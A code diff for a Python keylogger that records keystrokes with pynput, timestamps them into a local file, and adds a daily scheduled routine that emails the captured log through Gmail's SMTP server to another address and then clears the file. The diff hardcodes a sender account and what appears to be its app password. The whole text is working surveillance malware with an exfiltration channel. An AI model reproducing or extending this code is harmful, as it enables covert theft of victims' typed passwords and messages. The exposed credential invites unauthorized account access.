@@ -1,10 +1,13 @@
 from logging import exception
 import pygetwindow
+import smtplib
 import queue
 import pynput
 import threading
 import time
 import schedule
+from datetime import datetime
+from email.message import EmailMessage
 
 f_lock = threading.Lock()
 exit_ = 0
@@ -25,38 +28,78 @@ class FileManipulator:
                 try:
                     #get the fifo logg
                     logg = PyLoggs.keyQueue.get_nowait()
-                    f.write(logg)
+                    f.write(f'{logg} ~ {datetime.now()}\n')
+                    print(logg)
                 except queue.Empty as e:
                     print(f"Queue is empty test successful: {e}")
 
+            print("closing temporarily queue")
             f.close()
+
+
+    @classmethod
+    def make_message(cls, content):
+        msg = EmailMessage()
+        msg['Subject'] = f'logs ~ {datetime.now()}'
+        msg['From'] = 'krunkhehehaha@gmail.com'
+        msg['To'] = 'dudethatroll360@gmail.com'
+        msg.set_content(content)
+        return msg
 
 
     @staticmethod
     def send_overwrite():
         print("TIMER METHOD WAITING TO OVERWRITE")
         with f_lock:
+            print("timer entered send overwrite block")
+
             #resetting var so writer can continue
             global send_overwrite
             send_overwrite = 0
-            #SEND HERE
-            f = open("demofile.txt", "w")
+
+            #sending that email
+            print("sending email")
+            #creating a session
+            print("getting session")
+            s = smtplib.SMTP('smtp.gmail.com', 587)
+            #starting tls
+            print("starting tls")
+            s.starttls()
+            # Authentication
+            print("auth to fuckface")
+            s.login("krunkhehehaha@gmail.com", "doii tpmd gytk vomo")
+            #dumping file to message string
+            print("dumping file")
+            f = open("demofile.txt")
+            message = FileManipulator.make_message(f.read())
             f.close()
-            #REMOVE JUST A TEST
-            time.sleep(3)
+            #send the mail
+            print("yeet mail")
+            print(f'message -> {message}')
+            s.sendmail("krunkhehehaha@gmail.com", "dudethatroll360@gmail.com", message.as_string())
+
+            f = open("demofile.txt", "w")
+            print("overwrote file")
+            f.write("")
+            print("wrote empty string and closing now")
+            f.close()
 
 
 
 #the writer class to write to a file
 class TheWriter:
     @staticmethod
-#PUSH TO CLASS
     def write_to_file():
         FileManipulator.write_queue()
         ###while loop to check signal on lock to reenter
         while True:
-            print("waiting to reenter queue write")
-            FileManipulator.write_queue()
+            global send_overwrite
+            global exit_
+            if send_overwrite != 1:
+                print("waiting to reenter queue write")
+                FileManipulator.write_queue()
+            elif exit_ == 1:
+                break
 
 
 
@@ -85,6 +128,8 @@ class PyLoggs:
         if key == pynput.keyboard.Key.esc:
             global exit_
             exit_ = 1
+            global send_overwrite
+            send_overwrite = 1
         #add release to queue
         key_release = '{} released; it was {}'.format(
             key, 'faked' if injected else 'not faked')
@@ -116,7 +161,7 @@ class timer:
     #this will call the method to overwrite and send
     #the queue dumper should see the lock exited as its waiting to reenter
     @staticmethod
-    @schedule.repeat(schedule.every().day.at("22:36"))
+    @schedule.repeat(schedule.every().day.at("00:05"))
     def send_overwrite():
         global send_overwrite
         send_overwrite = 1
